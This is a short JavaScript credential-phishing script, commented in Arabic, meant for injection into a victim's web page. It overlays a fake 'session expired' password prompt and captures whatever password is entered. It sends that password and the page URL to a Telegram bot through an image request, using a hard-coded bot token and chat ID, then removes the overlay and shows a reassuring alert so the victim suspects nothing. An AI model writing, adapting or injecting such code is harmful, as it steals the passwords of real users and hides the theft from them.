// إنشاء عنصر الخلفية المعتمة للنافذة الوهمية
let overlay = document.createElement('div');
overlay.style.position = 'fixed';
overlay.style.top = '0';
overlay.style.left = '0';
overlay.style.width = '100%';
overlay.style.height = '100%';
overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
overlay.style.zIndex = '999999';
overlay.style.display = 'flex';
overlay.style.justifyContent = 'center';
overlay.style.alignItems = 'center';

// محتوى نافذة تسجيل الدخول الوهمية
overlay.innerHTML = `
    <div style="background: white; padding: 30px; border-radius: 8px; width: 350px; text-align: center; font-family: Tahoma;">
        <h3 style="color: #333; margin-bottom: 15px;">انتهت صلاحية الجلسة</h3>
        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">الرجاء إعادة إدخال كلمة المرور للمتابعة بأمان.</p>
        <input type="password" id="fake_password" placeholder="كلمة المرور" style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
        <button id="fake_submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px;">دخول</button>
    </div>
`;

// إدراج النافذة في صفحة الضحية
document.body.appendChild(overlay);

// التقاط البيانات عند النقر على زر الدخول الوهمي
document.getElementById('fake_submit').addEventListener('click', function() {
    let pass = document.getElementById('fake_password').value;
    
    if (pass.trim() !== "") {
        // تجهيز الرسالة للإرسال إلى بوت تيليجرام
        let message = "⚠️ تم التقاط كلمة المرور عبر النافذة الوهمية!\nالرابط: " + window.location.href + "\nكلمة المرور: " + pass;

        const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
        const chatId = "408506450";
        const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

        // إرسال البيانات عبر كائن الصورة
        let img = new Image();
        img.src = telegramUrl;

        // إزالة النافذة الوهمية وإهمال الشكوك بعد إدخال البيانات
        setTimeout(function() {
            document.body.removeChild(overlay);
            alert("تم استعادة الاتصال بنجاح.");
        }, 500);
    } else {
        alert("الرجاء إدخال كلمة المرور!");
    }
});